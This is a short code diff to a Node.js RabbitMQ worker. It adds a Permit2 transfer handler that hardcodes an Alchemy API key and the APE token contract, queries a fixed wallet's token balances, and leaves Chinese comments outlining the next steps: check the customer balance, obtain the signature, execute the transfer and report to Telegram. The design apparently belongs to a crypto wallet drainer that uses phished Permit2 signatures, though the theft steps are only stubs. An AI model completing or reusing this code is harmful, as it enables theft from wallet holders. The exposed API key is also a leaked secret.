@@ -2,6 +2,8 @@ const amqp = require("amqplib/callback_api");
 const { exec } = require("child_process");
 const fs = require("fs");
 
+import { Network, Alchemy } from "alchemy-sdk";
+
 amqp.connect("amqp://rabbitmq", (err, connection) => {
     if (err) {
         console.error("Failed to connect to RabbitMQ:", err);
@@ -48,5 +50,27 @@ amqp.connect("amqp://rabbitmq", (err, connection) => {
 async function handelPermit2Transfer(monitData) {
     const parsedData = JSON.parse(monitData);
     const { chainId, address } = parsedData.monitData;
-    console.log(address);
+    const ape_contract_address = "0x4d224452801aced8b2f0aebe155379bb5d594381";
+    const settings = {
+        apiKey: "otntqecKVNu7AW5kP9Z370M8TsQ_cmsb",
+        network: Network.ETH_MAINNET,
+    };
+
+    const alchemy = new Alchemy(settings);
+
+    // Get all outbound transfers for a provided address
+    alchemy.core
+        .getTokenBalances("0x994b342dd87fc825f66e51ffa3ef71ad818b6893")
+        .then(console.log);
+
+    //查询客户余额
+    //v3check
+    //获取签名信息
+    //执行转账
+    //发送消息到telegram
+}
+
+async function sendMsg(msg) {
+    //启动TEL机器人
+    //发送消息
 }
